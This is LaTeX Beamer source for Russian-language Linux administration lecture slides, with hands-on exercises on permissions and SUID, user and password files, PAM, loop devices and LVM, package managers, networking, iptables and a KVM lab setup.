					\item выполнение execute(x)
				\end{enumerate}
		\end{itemize}
		\column{0.48\textwidth}
		\begin{center}
			\textbf{Разрешения для директорий}
		\end{center}
		\begin{itemize}
			\item Три типа разрешений
				\begin{enumerate}
					\item поиск файлов в директории read(r) 
					\item добавление и удаление файлов write(w)
					\item заход в директорию execute(x)
				\end{enumerate}
		\end{itemize}
	\end{columns}

	\pause

	Попробовать {\tt ls -l /usr/bin}

	\pause

	Пересчет мнемонического разрешения в битовую маску 

	$r\to4, w\to2 , x\to1$ 

	rwxrw-r-x$\to$765
\end{frame}

\begin{frame}{Команды для управления пользователями и разрешениями файлов}
	\begin{columns}
		\column{0.48\textwidth}
		\begin{itemize}
			\item {\tt chown}
			\item {\tt chmod}
		\end{itemize}
		\column{0.48\textwidth}
		\begin{itemize}
			\item {\tt useradd, usermod, userdel}
			\item {\tt groupadd, groupmod, groupdel}
			\item {\tt su, sudo}
		\end{itemize}
	\end{columns}
\end{frame}

\begin{frame}
    \frametitle{}
	\begin{block}{Упражнения}
		\begin{enumerate}
			\item Создать директорию без r разрешения но с x разрешением, внутри нее создать поддиректорию с rwx разрешениями (для пользователя \defaultuser)
			\item Создать нового пользователя testuser.
			\item Скопировать {\tt /bin/bash} (под именем mysh) в домашнюю директорию пользователя \defaultuser  и поставить r-x разрешение только для other
			\item Попробовать выполнить скопированный файл от имени пользователя \defaultuser, затем от имени пользователя testuser
       \end{enumerate}
    \end{block}
\end{frame}
\begin{frame}
    \frametitle{}
	\begin{block}{Упражнения}
		\begin{enumerate}
			\item Создать новую группу testgroup
			\item Изменить группу владеющую mysh на testgroup и сделать {\tt chmod 474 mysh}
			\item Попробовать выполнить mysh от имени \defaultuser и root. 
			\item Добавить пользователя \defaultuser в группу testgroup и попробовать выполнить mysh еще раз
			\item Получить список групп которым принадлежат устройства в {\tt /dev}
		\end{enumerate}
	\end{block}
\end{frame}

\begin{frame}{SUID программы}
	\begin{block}{Попробовать}
		{\tt id}

		{\tt ls -l `which su`}
	\end{block}
	\pause
	\begin{itemize}
		\item Некоторые программы должны выполняться от имени обычного пользователя, но иметь больше привилегий
		\item Для этого у них устанавливается suid или sgid биты
		\item Установка suid (например {\tt chmod 4710 <file>})
	\end{itemize}
	\pause
	\begin{block}{Упражнение}
		\begin{itemize}
			\item Под root создать копию утилиты {\tt id} (назвать, например, {\tt id2}) в директории /usr/bin/
			\item Установить suid бит для этой утилиты
			\item Запустить {\tt id2} от имени пользователя \defaultuser
			\item То же с sgid битом
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}{Опасности SUID}
	\begin{itemize}
		\item Возможность backdoor через suid программу
			\begin{itemize}
				\item Shell игнорирует effective uid
				\item Скрипты обычно тоже игнорируют
				\item nosuid mount option
			\end{itemize}
		\item Атака через buffer overflow в существующей suid программе
			\begin{itemize}
				\item не использовать strcpy, sprintf, ... в security critical
				\item А если все же не уследили
					\begin{itemize}
						\item рандомизация стека
						\item grsecurity
						\item частично selinux
					\end{itemize}
			\end{itemize}
	\end{itemize}
\end{frame}


\begin{frame}{SUID, SGID и sticky bit для директорий}
	\begin{itemize}
		\item sgid для директорий -- все поддиректории и файлы внутри имеют тот же group id
		\item suid -- игнорируется
		\item Sticky bit (\tt{chmod +t mydir})
          \begin{itemize}
            \item Файлы из обычной директории может удалять любой пользователь с правами на запись в \emph{директорию}
            \item Файлы из директории со sticky bit может удалять только владелец директории, владелец файла или root.
          \end{itemize} 
	\end{itemize}
\end{frame}

\begin{frame}[fragile]
 \frametitle{UMASK}

	\begin{block}{umask}
		маска режима создания пользовательских файлов
	\end{block}

	Права доступа файлов, вычисляются c помощью побитовых операций:
    \begin{itemize}
      \item библиотечный вызов \tt{fopen} создает файл с разрешениями 
     \verb+ 0666 & ~umask +
      \item Системный вызов \tt{open(pathname,flags,mode)} создает файл с разрешениями \verb+ mode & ~umask +
   \end{itemize}
        

\end{frame}

\begin{frame}
	\begin{block}{Упражнение}
		\begin{enumerate}
			\item Создать от имени \tt{root} директорию \tt{/stick} с установленными битами \tt{sticky} и \tt{SGID}, а также разрешениями на чтение, запись и выполнение для всех
			\item От имени пользователя \tt{root} создать пустой файл \tt{testroot}
			\item Изменить \tt{umask} пользователя \tt{root} на 002
			\item От имени пользователя \tt{root} создать пустой файл \tt{testroot2}
			\item От имени пользователя \tt{\defaultuser} создать пустой файл \tt{testuser}
			\item Посмотреть получившиеся права и принадлежность файлов
			\item Отредактировать файл \tt{testroot2}
			\item Попробовать удалить файл \tt{testroot2}
		\end{enumerate}
	\end{block}
\end{frame}



}
\mode<all>{\begin{frame}{Хранение информации о пользователях в системе}

	\begin{block}{\tt /etc/group}
		{\tt  group\_name:password:GID:user\_list}
	\end{block}
	
	\pause

	\begin{block}{\tt /etc/passwd}
		{\tt account:password:UID:GID:GECOS:directory:shell}

		\begin{itemize}
			\item {\tt *} -- пароль не задан
			\item {\tt x} -- пароль задан в файле {\tt /etc/shadows}
		\end{itemize}
	\end{block}

	\pause

	\begin{block}{\tt /etc/shadow}
		\begin{enumerate}
			\begin{columns}
			\column{0.3\textwidth}

			\item login name
			\item encrypted password
			\item date of last password change

			\column{0.3\textwidth}		
			\item minimum password age 
			\item maximum password age
			\item password warning period

			\column{0.3\textwidth}
			\item password inactivity period
			\item account expiration date
			\item reserved field

			\end{columns}
		\end{enumerate}
	\end{block}

\end{frame}

\begin{frame}{Практическое задание}
    \begin{itemize}
		\item Посмотреть права доступа к файлам {\tt group}, {\tt passwd}, {\tt shadow}\\
			{\tt ls -l /etc/{group, passwd, shadow}}
		\item Добавить пользователя и группу и посмотреть изменения в перечисленных файлах
		\item Cоздать пользователя без использования системных утилит
    \end{itemize}
	\pause
	 \begin{itemize}
		\item Изменить пароль пользователю с помощью утилиты {\tt passwd}\\
			Hint: {\tt /etc/passwdqc.conf}
		\item Сбросить пароль пользователю\\
			Hint: {\tt usermod}
    \end{itemize}
\end{frame}


}
\mode<all>{\begin{frame}{PAM}
	% http://www.opennet.ru/base/net/pam_linux.txt.html
	\begin{itemize}
		\item PAM это динамическая библиотека
		\item Конфигурация PAM
			\begin{itemize}
				\item {\tt /etc/pam.conf}
				\item {\tt /etc/pam.d/...}
					\begin{itemize}
						\item Сервисы
						\item system\_auth
					\end{itemize}
			\end{itemize}
	\end{itemize}

	\begin{block}{Формат записи}
		\begin{columns}
			\column{0.245\textwidth}
			\textbf{module type}
			 \begin{itemize}
				 \item auth
				 \item account
				 \item session
				 \item password
			 \end{itemize}
			 \column{0.245\textwidth}
			 \textbf{control flag}
			 \begin{itemize}
				 \item requisite
				 \item required
				 \item sufficient
				 \item optional
			 \end{itemize}
			 \column{0.245\textwidth}
			 \textbf{module name}
			 \column{0.245\textwidth}
			 \textbf{module options}
		 \end{columns}
	 \end{block}
\end{frame}

\begin{frame}{Диспетчер службы имен (NSS)}

	Важная информация для системы:
		
	\begin{itemize}
		\item Информация о пользователях (логин, группа, пароль и т.д.)
		\item Информация о сетевых ресурсах (имена хостов, протоколов, сервисов)
    \end{itemize}

	\pause

	\begin{block}{NSS}
		\begin{itemize}
			\item Конфигурация: {\tt /etc/nsswitch.conf}
			\item Динамические библиотеки сервисов: {\tt ls -1 /lib*/libnss\_*}
		\end{itemize}
	\end{block}

\end{frame}



}

\chapter{Дисковая подсистема}
\mode<all>{\begin{frame}{Дисковая подсистема}

	\begin{block}{Блочное устройство}
		Вид файла устройств в UNIX/Linux-системах,  обеспечивающий интерфейс к устройству,
		реальному или виртуальному, в виде файла в файловой системе.
	\end{block}

	\begin{block}{Файловая система}
		Файловая система определяет формат содержимого и способ физического хранения информации,  
		которую принято группировать в виде файлов. 
		Конкретная файловая система определяет размер имени файла (директории),  
		максимальный возможный размер файла и раздела,  набор атрибутов файла.

		Распространенные для ОС Linux: ext2, ext4, xfs, reiserfs, vfat.
	\end{block}
\end{frame}

\begin{frame}{Примеры блочных устройств}

	\begin{itemize}
		\item {\tt /dev/{\bf s}d*}
		\item {\tt /dev/{\bf h}d*}
		\item {\tt /dev/ram*}
		\item {\tt /dev/loop*}
	\end{itemize}

	\begin{block}{Практическое задание:}
		\begin{enumerate}
			\item Посмотреть список вышеперечисленных устройств
			\item Посмотреть информацию об устройствах {\tt loop0, ram, sda}\\
				Hint: {\tt fdisk -l <device>}
		\end{enumerate}
	\end{block}
\end{frame}

\begin{frame}{Структура диска}
	\begin{columns}
		\column{0.6\textwidth}
		\includegraphics[height=0.8\textheight]{../../slides/disk/04-hd-schematic.png}
		\column{0.4\textwidth}
		\includegraphics[height=0.8\textheight]{../../slides/disk/04-disk-structure.png}
	\end{columns}
\end{frame}

\begin{frame}{Отображение блочных устройств}


	\begin{block}{Device Mapper}
			{\tt /dev/mapper/*}\\
			device-mapper -- служит общим фреймворком для отображения одного блочного устройства на другое.

			Примеры: RAID, LVM, шифрованные диски и т.д.
	\end{block}

\end{frame}



}
\section{Блочные устройства}
\mode<all>{\begin{frame}{Полезные утилиты}
	\begin{columns}
		\column{0.25\textwidth}
		\begin{itemize}
			\item {\tt fdisk}
			\item {\tt parted}
			\item {\tt kpartx}
		\end{itemize}
		\column{0.25\textwidth}
		\begin{itemize}
			\item {\tt dd}
			\item {\tt losetup}
		\end{itemize}
		\column{0.25\textwidth}
		\begin{itemize}
			\item {\tt mkfs}
			\item {\tt fsck}
		\end{itemize}
		\column{0.25\textwidth}
		\begin{itemize}
			\item {\tt mount}
			\item {\tt umount}
			\item {\tt df}
		\end{itemize}
	\end{columns}

	\bigskip
	Понадобятся для упражнений:
	\begin{itemize}
			\item[*] {\tt chroot}
			\item[*] {\tt kvm}
	\end{itemize}
\end{frame}


\begin{frame}{Практика: отображение файла на loop-устройство}
	\begin{enumerate}
		\item Создать пустой файл размером 100MB: \\
			dd if=/dev/zero of=test bs=1M count=100
			\pause
		\item Найти неиспользуемое loop-устройство и отобразить на него файл:\\
			losetup -f \\
			losetup loop0 test
			\pause
		\item Посмотреть структуру loop-устройства, создать разделы и посмотреть результаты:\\
			fdisk -l /dev/loop0 \\
			fdisk /dev/loop0 \\
			fdisk -l /dev/loop0
			\pause
		\item Дать команду ядру перечитать разделы и создать устройства для разделов:\\
			ls -l /dev/mapper/* \\
			kpartx -a /dev/loop0 \\
			ls -l /dev/mapper/* \\
	\end{enumerate}
\end{frame}

\begin{frame}{Практика: создание файловой системы}
	\begin{enumerate}
		\item Форматируем файловую систему на устройстве: \\
			mkfs.ext2 /dev/mapper/loop0p1
			\pause
		\item и монтируем:\\
			mkdir -p /mnt/fs\\
			mount\\
			mount /dev/mapper/loop0p1 /mnt/fs\\
			mount\\
			df
			\pause
	\end{enumerate}
\end{frame}


\begin{frame}{Практика: чистимся}
	\begin{enumerate}
		\item Найти смонтированные разделы и отмонтировать их: \\
			mount \\
			umount /dev/mapper/loop0p1
			\pause
		\item Найти используемые loop-устройства\\
			losetup -a \\
			\pause
		\item Корректно удалить устройства для разделов:\\
			ls -l /dev/mapper/* \\
			kpartx -d /dev/loop0 \\
			ls -l /dev/mapper/* \\
			\pause
		\item Удалить отображение файла на loop-устройство: \\
			losetup -d /dev/loop0
	\end{enumerate}
\end{frame}


}
\section{RAID}
\mode<all>{\begin{frame}{Программный RAID}
  \begin{center}
    \textbf{Уровни RAID поддерживающиеся софтверно}
   \end{center}
   \begin{enumerate}
     \item RAID 0 (длинный диск)
     \pause
     \item RAID 1 (зеркалирование)
     \pause 
     \item RAID 4 (отдельный диск на проверку четности)
     \pause
     \item RAID 5 (данные о четности распределены по дискам)
     \pause
     \item RAID 6 (устойчив при потере двух дисков из 4+)
     \pause
     \item RAID 10 (RAID0 поверх RAID1)
     \pause
     \item RAID 0+1 (RAID1 поверх RAID0)
   \end{enumerate}
\end{frame}

}
\section{LVM}
\mode<all>{\begin{frame}{LVM -- управление логическими томами}
  \begin{center}
    \textbf{Структура LVM}
  \end{center}
  \includegraphics[width=0.7\textwidth]{../../slides/disk/LVM1-wiki.png}
\end{frame}

\begin{frame}{Преимущества LVM}
	\begin{itemize}
		\item Изменение размера
		\item Перемещение данных в активной системе
		\item Присвоение имен устройствам
		\item Чередование дисков
		\item Зеркалирование томов
		\item Снимки томов
	\end{itemize}
\end{frame}
 
\begin{frame}{LVM -- основные команды}
  \begin{itemize}
    \item Создание
      \begin{columns}
        \column{0.2\textwidth}
        \begin{itemize}
          \item pvcreate
        \end{itemize}
        \column{0.2\textwidth}
        \begin{itemize}
          \item vgcreate
        \end{itemize}
        \column{0.2\textwidth}
        \begin{itemize}
          \item lvcreate
        \end{itemize}
      \end{columns}
     \item Информация 
       \begin{columns}
         \column{0.2\textwidth}
         \begin{itemize}
           \item pvs
           \item lvs
           \item vgs
		   \item[ ]
         \end{itemize}
         \column{0.2\textwidth}
         \begin{itemize}
           \item pvscan
           \item lvscan
           \item vgscan
		   \item lvmdiskscan
         \end{itemize}
         \column{0.2\textwidth}
         \begin{itemize}
           \item pvdisplay
           \item lvdisplay
           \item vgdisplay
		   \item[ ]
         \end{itemize}
	 \end{columns}
      \item Манипулирование
        \begin{itemize}
          \item pvmove
          \item pvremove
          \item vgextend/vgreduce
          \item lvresize
         \end{itemize}
     \end{itemize}
    
\end{frame}

\begin{frame}{Упражнение: создание}
  \begin{enumerate}
    \item Создать 3 файла (200MB) и отобразить на {\tt /dev/loop[0-]}
	\item Найти устройства для работы с LVM {\tt lvmdiskscan}
	\item  {\tt pvcreate /dev/loop[0-2]}
    \item  {\tt pvscan, pvdisplay, pvs}
		\pause
    \item Создание группы томов {\tt vgcreate VG0 /dev/loop[0-2]}
    \item {\tt pvscan, vgscan, pvdisplay}
		\pause
    \item Создание логического тома {\tt lvcreate  -l 50\%VG -i 3 -n lv1 VG0}
	\item Создание файловой системы ext2 на {\tt /dev/VG0/lv1} и монтирование в {\tt /mnt/myfs}
	\end{enumerate}
\end{frame}


\begin{frame}{Упражнение: Создание снимка LVM}
  \begin{enumerate}
    \item Скопировать несколько файлов на { \tt /mnt/myfs}
    \item  {\tt lvcreate -\phantom{}-snapshot -l 10\%VG -n snap /dev/VG0/lv1}
    \item  {\tt lvdisplay, lvs, lvscan}
	\item Смонтировать снимок в {\tt /mnt/snap}
		\pause
    \item Удалить один из файлов на {\tt /mnt/snap/} или {\tt /mnt/myfs/}
	\item Отмонтировать снимок и оригинал
		\pause
	\item Объединяем снимок с оригиналом {\tt lvconvert -\phantom{}-merge VG0/snap}
	\item Монтируем {\tt /dev/VG0/lv1} в {\tt /mnt/myfs} и проверяем изменения
  \end{enumerate}
\end{frame}

\begin{frame}{Упражнение: изменение размера VG}
  \begin{enumerate}
%	\item Отмонтировать {\tt /mnt/myfs}
	\item Создать еще один файл и отобразить его на {\tt loop3}
	\item Увеличиваем размер группы {\tt vgextend VG0 /dev/loop3}
		\pause
    \item  {\tt pvscan; pvmove /dev/loop0; pvscan}
    \item  {\tt vgreduce VG0 /dev/loop0; pvscan}
    \item  {\tt pvremove /dev/loop0; pvscan}
  \end{enumerate}
\end{frame}


}
\chapter{Управление пакетами}
\mode<all>{\begin{frame}{Система управления пакетами: для чего это нужно}
\begin{itemize}
 \item ''DLL Hell''
 \item Dependency hell
 \item Общие задачи пакетного менеджера:
   \begin{itemize}
     \item Проверка целостности пакетов
     \item Проверка зависимостей пакетов
        \item Поддержание списка установленных пакетов
        \item Автоматическое удаление пакетов
     \item Предоставление доступа к репозиторию пакетов
     \item Разрешение зависимостей
   \end{itemize}
\end{itemize}
\end{frame}

\begin{frame}{Debian-based и RedHat-based системы управления пакетами}
\begin{center}
 \textbf{Два уровня пакетных менеджеров}
\end{center}
\begin{columns}
  \column{0.4\textwidth}
  \begin{center}
    \textbf{RedHat-based}
  \end{center}
  \begin{itemize}
    \item yum
    \item rpm
  \end{itemize}
  \column{0.4\textwidth}
  \begin{center}
    \textbf{Debian-based}
  \end{center}
  \begin{itemize}
    \item aptitude, apt, synaptic
    \item dpkg
  \end{itemize}
\end{columns}
\end{frame}

\begin{frame}{RPM: структура пакета}
	\begin{itemize}
		\item Метаданные
			\begin{itemize}
				\item Имя
				\item Версия/Релиз
				\item Группа
				\item Описание
				\item ...
			\end{itemize}
		\item Архив с файлами
			\begin{itemize}
				\item cpio
			\end{itemize}
		\item Скрипты
			\begin{itemize}
				\item Pre Install
				\item Post Install
				\item Pre Uninstall
				\item Post Uninstall \bigskip
				\item Triggers
			\end{itemize}
	\end{itemize}
\end{frame}
}
\section{RPM}
\mode<all>{\begin{frame}{RPM: команды}
	\begin{block}{Установка пакета}
		{\tt rpm -i [rpm-file1] ... [[url://]rpm-fileN] }
	\end{block}
	\begin{block}{Удаление пакета}
		{\tt rpm -e pkgname1 ... pkgnameN }
	\end{block}
	\begin{block}{Обновление пакета}
		{\tt rpm -U [rpm-file1] ... [[url://]rpm-fileN] }
	\end{block}
	\begin{block}{Проверка пакета}
		{\tt rpm -V pkgname1 ... pkgnameN }
	\end{block}
\end{frame}

\begin{frame}{RPM -q: часто используемые опции опроса}

	\begin{itemize}
		\item {\tt pkgname} -- выбор пакета, установленного в системе
		\item {\tt -a} -- все пакеты, установленные в системе
		\item {\tt -p} -- использовать файл RPM
	\end{itemize}


	\begin{itemize}
		\item {\tt -i} -- показать информацию пакета\\
			{\tt rpm -q -i glibc }
		\item {\tt -l} -- показать список файлов пакета \\
			{\tt rpm -q -l glibc }
		\item {\tt -{}-whatprovides} -- \\
			{\tt rpm -q --whatprovides java}
		\item {\tt -{}-whatrequires} -- \\
			{\tt rpm -q --whatrequires /bin/bash}
		\item {\tt -{}-queryformat} -- формат вывода\\
			{\tt rpm -q -{}-whatrequires /bin/bash -{}-queryformat ''\%\{name\} ''}

	\end{itemize}

\end{frame}


}
\section{YUM}
\mode<all>{\newcounter{tmpc}

\begin{frame}{Репозиторий}
	\begin{block}{Репозиторий пакетов}
		Место, где хранятся и поддерживаются пакеты, а также сопутствующая мета-информация, предназначенное для использования пакетным менеджером.
	\end{block}
	\begin{block}{Пример: Fedora Core}
		\begin{itemize}
			\item Packages/*.rpm
			\item RPM-GPG-KEY-*
			\item repodata
			\begin{itemize}
				\item множество сжатых и несжатых XML файлов для YUM
			\end{itemize}
		\end{itemize}

		Описание репозтория для YUM на локальной системе хранится по пути
		{\tt /etc/yum.repos.d/*.repo}
	\end{block}
		
\end{frame}

\begin{frame}{Apt: команды}
	\begin{block}{Установка/обновление пакета}
		{\tt apt-get install pkgname }

                {\tt apt-get -f install}
	\end{block}
	\begin{block}{Обновление данных о пакетах}
		{\tt apt-get update }
	\end{block}
	\begin{block}{Удаление пакета}
		{\tt apt-get remove pkgname }
	\end{block}
	\begin{block}{Поиск}
		{\tt apt-cache search pkgname }
	\end{block}
\end{frame}

\begin{frame}{YUM: команды}
	\begin{block}{Установка/обновление пакета}
		{\tt yum install pkgname }
	\end{block}
	\begin{block}{Обновление всех пакетов}
		{\tt yum update }
	\end{block}
	\begin{block}{Удаление пакета}
		{\tt yum remove pkgname }
	\end{block}
	\begin{block}{Поиск}
		{\tt yum list pkgname }\\
		{\tt yum search pkgname }
	\end{block}
\end{frame}


\begin{frame}[fragile]{Упражнение}
%  \begin{enumerate}
%      \item Создать на {\tt /dev/sda} раздел размером примерно 10Gb
%      \item Создать на этом разделе ext3 ФС и смонтировать раздел в {\tt /mnt/chroot}
%      \item Развернуть {\tt /media/nfs/pub/CentOS/precreated/centOS.tar.gz} в {\tt /mnt/chroot}
%      \item Смонтировать {\tt proc, sysfs} а также {\tt /dev} в соответствующие места {\tt /mnt/chroot}
%      \item {\tt chroot /mnt/chroot}
%      \item Отредактировать {\tt /etc/resolv.conf} -- скопировать туда информацию из {\tt resolv.conf} основной системы
%      \item Отредактировать {\tt /etc/yum.conf} Добавить следующий раздел
%\begin{minipage}{0.5\textwidth}
%\begin{verbatim}
%[base]
%  name = CentOS 6
%  baseurl = ftp://192.168.11.15/CentOS
%  gpgcheck = 0
%\end{verbatim}
%\end{minipage}
%\setcounter{tmpc}{\theenumi}
%\end{enumerate}
%\end{frame}
%\begin{frame}{Продолжение упражнения}
  \begin{enumerate}
      %\setcounter{enumi}{\thetmpc}
      \item {\tt apt-get update}
      \item Удалить пакет vim
      \item Установить заново пакет vim
      \item Посмотреть списки файлов для пакетов {\tt rpm, vim}
      \item Найти, к какому пакету относится команда {\tt ls, top}
      \item Найти пакет предоставляющий сервис ssh и установить его
    \end{enumerate}
\end{frame}


}

\chapter{Сетевая подсистема}
\mode<all>{\begin{frame}{Сетевая подсистема Linux}

	\begin{block}{Cетевой интерфейс}

		Сетевой интерфейс в Linux -– это абстрактный именованный объект,  используемый для передачи 
		данных через некоторую линию связи без привязки к ее (линии связи) реализации.
	\end{block}
\end{frame}

\begin{frame}{Сетевая подсистема Linux}

	\center\includegraphics[width=0.9\textwidth]{../../slides/networking/06-netstack.png}

\end{frame}


}
\mode<all>{\begin{frame}{Команды управления настройками сети}
	\begin{itemize}
	  \item ifconfig/route
	  \item iproute2
	\end{itemize}

	\begin{itemize}
		\item Список интерфейсов
			\begin{itemize}
				\item {\tt ifconfig -a}
				\item {\tt ip link show}
			\end{itemize}
		\item Включение интерфейса 
			\begin{itemize}
				\item {\tt ifconfig <iface> up}
				\item {\tt ip link set <iface> up}
			\end{itemize}
	  \item Выключение интерфейса
			\begin{itemize}
				\item {\tt ifconfig <iface> down}
				\item {\tt ip link set <iface> down}
			\end{itemize}
	  \item Назначение адреса
			\begin{itemize}
				\item {\tt ifconfig eth0 192.168.1.17 netmask 255.255.254.0 up}
				\item {\tt ip addr add 192.168.1.17/23 dev eth0}
			\end{itemize}
	\end{itemize}
\end{frame}

\begin{frame}{Конфигурационные файлы}
  \begin{itemize}
    \item {\tt /etc/resolv.conf}
    \item {\tt /etc/hosts}
	\item {\tt /etc/sysconfig/network}
    \item {\tt /etc/sysconfig/network-scripts}\\
		{\tt /etc/sysconfig/network-scripts/ifcfg-eth0}
  \end{itemize}
\end{frame}

\begin{frame}{Дополнительные интерфейсы}
	\begin{block}{Алиасы}
		\begin{itemize}
			\item ifconfig <iface>:<alias> <ip> up
			\item ifconfig <iface> add <ip> up
			\item ip addr add <ip> {\bf label} <iface>:<alias> dev <iface>
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}{''Виртуальные'' интерфейсы}
	\begin{block}{TUN/TAP}

		{\tt modprobe tun}

		\begin{itemize}
			\item Добавить -- {\tt tunctl -t <ifacename>}
			\item Удалить -- {\tt tunctl -d <ifacename>}
		\end{itemize}
	\end{block}
\end{frame}


}
\mode<all>{\begin{frame}{Мосты}
	\begin{itemize}
		\item Создать -- {\tt brctl addbr <bridge>}
		\item Удалить -- {\tt brctl delbr <bridge>}
		\item Добавить интерфейс -- {\tt brctl addif <bridge> <device>}
		\item Удалить интерфейс-- {\tt brctl addif <bridge> <device>}
	\end{itemize}
\end{frame}


}
\mode<all>{\begin{frame}{Полезные утилиты}
	\begin{center}
		\begin{itemize}
			\item netstat / ss
			\item nslookup / dig
			\item ping
			\item traceroute
			\item tcpdump
			\item telnet
			\item netcat
			\item nmap
		\end{itemize}
	\end{center}

\end{frame}


\begin{frame}{Полезные утилиты: практика}

	\begin{columns}
		\column{0.5\textwidth}
		\begin{block}{netstat}

			Узнать:
			\begin{itemize}
				\item список используемых сокетов
				\item серверных сокетов
				\item имена/pid серверов
				\item узнать номера портов
			\end{itemize}
		\end{block}
	
		\pause
		\column{0.5\textwidth}
		\begin{block}{telnet/netcat}

			\begin{itemize}
				\item Чат по протоколу TCP с соседом
				\item Чат по протоколу UDP с соседом
				\item Передать текстовый и бинарный файлы
			\end{itemize}
	
			При создании чата использовать {\tt netstat} и {\tt tcpdump}
			для получения информации о соединении.
		\end{block}
	
	\end{columns}
\end{frame}

nmap
1. сканирование соседа
2. сканирование выделенных портов у соседа (поиск сервера чата) 
3. узнать список открытых портов на всех машинах в 505
4. узнать список  работающих машин

tcpdump
0. pcap файлы/libpcap
1. запуск монитора
2. запуск чата
3. монитор-фильтр-анализ

}
\mode<all>{\begin{frame}{Маршрутизация}
	\begin{itemize}
		\item netstat -r
		\item route
		\item ip route show
	\end{itemize}

	\begin{block}{Разрешить маршрутизацию на хосте}
		{\tt echo 1 > /proc/sys/net/ipv4/ip\_forward}
	\end{block}
\end{frame}


}
\mode<all>{\begin{frame}{Iptables}

	\center\includegraphics[width=1\textwidth]{../../slides/networking/06-iptables.png}

\end{frame}

\begin{frame}{Iptables}

	\center{\bf iptables -t <table> -L}
	\center{\bf iptables -t <table> -F}
	\bigskip

	\begin{itemize}
	\begin{columns}
		\column{0.3\textwidth}

			\item filter -- файерволл
				\begin{itemize}
					\item INPUT
					\item FORWARD
					\item OUTPUT
				\end{itemize}
		\column{0.3\textwidth}
			\item nat -- преобразования адресов
				\begin{itemize}
					\item PREROUTING
					\item INPUT
					\item OUTPUT
					\item POSTROUTING
				\end{itemize}
		\column{0.3\textwidth}
			\item mangle -- специальные  изменения  пакетов (TOS, TTL, MARK)
				\begin{itemize}
					\item PREROUTING
					\item INPUT
					\item FORWARD
					\item OUTPUT
					\item POSTROUTING
				\end{itemize}
		\end{columns}
	\end{itemize}

\end{frame}


\begin{frame}{Iptables: примеры}

	\center{\bf iptables -t <table> <CRITERIA> <TARGET>}
	\small
	\begin{itemize}
		\item filter:\\
			{\tt iptables -A INPUT -s 192.168.0.1/24 -p UDP -j REJECT -{}-reject-with icmp-host-unreachable}\\
			{\tt iptables -A INPUT -d 192.168.0.1/24 -p TCP -j DROP}
		\item nat:\\
			{\tt iptables -A POSTROUTING -t nat -s 192.168.1.0/24 -j MASQUERADE}\\
			{\tt iptables -t nat -A PREROUTING -p tcp -d 192.168.251.1 
			--dport 8080 -{}-sport 1024:65535 -j DNAT -{}-to 192.168.1.200:8080}
		\item mangle:\\
			{\tt iptables -A PREROUTING -t mangle -p tcp -{}-dport 22 -j MARK -{}-set-mark 100}\\
			{\tt ip route add default dev eth0 table 1}\\
			{\tt ip rule add fwmark 100 table 1}
	\end{itemize}

\end{frame}


\begin{frame}[fragile]{Упражнение}
    \begin{block}{Внутренняя сеть: маскарадинг}
        \begin{enumerate}
            \item Добавить в netns 'A' правило для таблицы {\tt nat},
                включающее маскарадинг для IP-адреса, использующегося в netns 'B'
            \item Запустить {\tt ping -n <IP>} в netns 'B'\\
                IP -- адрес соседа для {\tt ethA0}
            \item Запустить {\tt tcpdump -i ethA0 icmp} в netns 'A'
            \item Запустить {\tt tcpdump -i eth0 icmp} на хосте (без использования netns)
            \item Запретить входящий ''{\tt ping}'' для {\tt ethA0}:\\
                {\tt iptables -A INPUT -i ethA0 -p icmp -j REJECT --reject-with icmp-host-unreachable}
        \end{enumerate}
    \end{block}
\end{frame}
}
\mode<all>{\begin{frame}{Практика: создание тестовой среды}

	\center\includegraphics[height=0.4\textheight]{../../slides/networking/net-practice.png}


	\begin{block}{Задача}
		Запустить 3 идентичные виртуальные машины.\\
		Каждой машине назначить адрес из отдельного IP диапазона.\\
		Организовать сетевую ''видимость'' между виртуальными машинами, а также хостом.		
	\end{block}

\end{frame}



\begin{frame}
	\frametitle{Подготовка дисковой подсистемы}
			\begin{itemize}
				\item Создать пустой файл размером от 1.5 GB и отобразить на устройство
					/dev/loop0 ({\tt dd, losetup})
				\item Создать группу томов на базе этого устройства ({\tt pvcreate, vgcreate})
				\item Выделить 1 GB под логический диск ({\tt lvcreate})
				%\item Скопировать образ виртуального диска в полученный логический том ({\tt dd})
				%\item Создать снимок логического тома на 100MB ({\tt lvcreate}) для каждой виртуальной машины.
			\end{itemize}
\end{frame}

\begin{frame}[fragile]{Установка системы}
        \begin{itemize}
		\item Установить centos-minimal на  машину из iso файла.
		\item Создать два снимка логического тома виртуальной машины
		\item Убедиться в наличии tap интерфейсов
	\end{itemize}

\end{frame}

\begin{frame}[fragile]{Пример запуска kvm}
		\begin{itemize}
          \item {\tt modprobe kvm-intel} {\small Включаем модуль поддержки виртуализации в ядре} 
          \item {\tt modprobe tun}  {\small Включаем поддержку tun, tap виртуальных сетевых интерфейсов}
          \item 
            \begin{lstlisting}[language=bash,basicstyle=\tiny] 
kvm -enable-kvm -cdrom centos-minimal.iso -hda /dev/loop0 -m 512M   \
    -boot order=cd -serial stdio -net nic,model=rtl8139 -net tap,ifname=tap0 
            \end{lstlisting}
              \begin{enumerate}
                \item[{\tt -enable-kvm}] Включает ядерную поддержку виртуализации
                \item[{\tt -cdrom}] Устройство или disk image, cdrom виртуальной машины
                \item[{\tt -hda}] Устройство или disk image, представляет жесткий диск VM
                \item[{\tt -serial}] Перенаправление com порта (консоль ядра)
                \item[{\tt -net nic}] Условная модель сетевой карточки
                \item[{\tt -net tap}] TAP интерфейс, на который будет приходить сеть из VM
                \item[{\tt -boot order}] cd (вначале cdrom (с), потом диск (d))
                \item[{\tt -m}] Объем памяти для VM
              \end{enumerate}
        \end{itemize}
\end{frame}        


\begin{frame}
	\frametitle{Настройка сети на хосте}
			\begin{itemize}
				\item Создать мост {\tt brctl} и назначить ему адреса из соответствующих диапазонов {\tt ifconfig/ip}
				\item Поднять виртуальные интерфейсы {\tt ifconfig/ip}
				\item Добавить виртуальные интерфейсы к мосту {\tt brctl}
			\end{itemize}
\end{frame}


\begin{frame}
	\frametitle{Настройка сети на виртуальных машинах}
			\begin{itemize}
				\item Назначить адрес устройству eth0 {\tt ifconfig/ip}
				\item Добавить адрес маршрутизатора по умолчанию {\tt route/ip}
				\item Проверить доступность виртуальных машин и хоста {\tt ping/nmap}
			\end{itemize}
\end{frame}

\begin{frame}
	\frametitle{Настройка роутинга и NAT}
			\begin{itemize}
				\item Разрешить форвардинг на хосте
				\item Настроить NAT на хосте ({\tt iptables},  правило {\tt MASQUERADE})
				\item Проверить доступность хостов из ''внешней'' сети {\tt ping/nmap}
			\end{itemize}
\end{frame}
}

